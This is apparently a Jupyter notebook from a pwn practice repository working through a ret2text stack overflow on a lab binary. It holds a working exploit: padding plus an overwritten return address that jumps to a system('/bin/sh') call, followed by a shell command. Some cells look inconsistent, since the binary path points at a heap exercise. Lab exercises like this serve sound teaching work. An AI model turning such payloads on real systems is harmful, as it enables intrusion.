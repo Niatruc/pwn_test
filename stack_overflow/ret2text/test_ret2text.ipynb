{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "The autoreload extension is already loaded. To reload it, use:\n  %reload_ext autoreload\n"
     ]
    }
   ],
   "source": [
    "%load_ext autoreload\n",
    "%autoreload 2\n",
    "formatter = get_ipython().display_formatter.formatters['text/plain']\n",
    "formatter.for_type(int, lambda n, p, cycle: p.text(\"0x%X\" % n))\n",
    "\n",
    "import os\n",
    "os.sys.path.append('../../')\n",
    "\n",
    "from pwn import *\n",
    "from util import *\n",
    "\n",
    "ret2text=ELF('/home/bohan/res/ubuntu_share/pwn_test/fastbin_dup/heap')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "output_type": "error",
     "ename": "KeyboardInterrupt",
     "evalue": "",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mKeyboardInterrupt\u001b[0m                         Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-14-0a238d91e46d>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[0;32m----> 1\u001b[0;31m \u001b[0mos\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mread\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mw_pipe\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;36m1\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[0;31mKeyboardInterrupt\u001b[0m: "
     ]
    }
   ],
   "source": [
    "os.read(w_pipe, 1)"
   ]
  },
  {
   "source": [
    "该程序在栈上保存gets获取的字符串.\n",
    "\n",
    "<img alt=\"store_str\" src=\"./pic/store_str.jpg\" width=\"40%\" height=\"40%\">\n",
    "\n",
    "程序中有个未调用的secure函数, 其中调用了system函数.\n",
    "\n",
    "<img alt=\"secure_func\" src=\"./pic/secure_func.jpg\" width=\"45%\" height=\"45%\">\n",
    "\n",
    "可由gets覆盖到返回地址, 以跳转到secure调用system前将\"/bin/sh\"压栈的地方\n",
    "\n",
    "<img alt=\"retn_addr\" src=\"./pic/retn_addr.jpg\" width=\"40%\" height=\"40%\">\n"
   ],
   "cell_type": "markdown",
   "metadata": {}
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [],
   "source": [
    "payload = b'a' * (0x60c - 0x59c) + p32(0x0804863a)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [],
   "source": [
    "write_pipe(payload + b'\\n')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [],
   "source": [
    "send_line2('ls')"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "name": "python3",
   "display_name": "Python 3.6.9 64-bit",
   "metadata": {
    "interpreter": {
     "hash": "1386ef3c21086d93d14bbe00e82e60168009a16fd818e6ae91963c00607acbde"
    }
   }
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.9-final"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}